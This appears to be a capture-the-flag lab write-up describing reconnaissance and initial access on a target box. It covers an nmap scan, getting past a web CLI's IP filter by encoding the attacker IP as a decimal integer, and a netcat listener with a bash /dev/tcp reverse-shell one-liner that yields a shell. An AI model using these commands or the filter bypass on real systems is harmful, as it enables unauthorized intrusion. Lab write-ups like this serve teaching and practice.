# Phase 1: Reconnaissance & Initial Access 🔍

Here is how I managed to get my first shell on the target machine.

## 1. Nmap Scan
First things first, I started with a standard Nmap scan to see what ports were open.

```bash
nmap -sC -sV -p- -T4 TARGET_IP
What I found:
Port 22 , 80 and 443 were open. While checking the certificates and routing, I also noticed a couple of interesting subdomains: earth.local and terrestrial.local. I added these to my /etc/hosts file to explore further.

2. Hitting a Wall (The Web CLI Filter)
While browsing the site, I stumbled upon a secure admin/testing page that had a web-based Command Line Interface (CLI). It looked like a tool meant for basic network diagnostics (like running ping).

Naturally, I tried to inject a reverse shell payload right away. But the application blocked it immediately, throwing an error saying that standard IP formats or certain characters were forbidden by their security policy.

3. The Bypass: Decimal IP Encoding
Since the filter was strictly looking for regular IPv4 formats (like 192.168.x.x), I needed a way to provide my IP without using dots.

I decided to convert my Kali Linux IP address into a Decimal Integer.

The math behind it is basically flattening the 4 octets of the IP:

To the operating system, xxxxxxxxxx means exactly the same thing as 192.168.x.x, but it looks like a regular number to the web filter.

4. Catching the Shell
I set up a Netcat listener on my Kali machine:

Bash
nc -lnvp 4444
Then, I went back to the web CLI and executed the payload using the decimal IP format to bypass the regex block:

Bash
bash -i >& /dev/tcp/xxxxxxxxxx/4444 0>&1
It worked perfectly. The filter didn't catch it, the connection went through, and I got a reverse shell as the apache user!
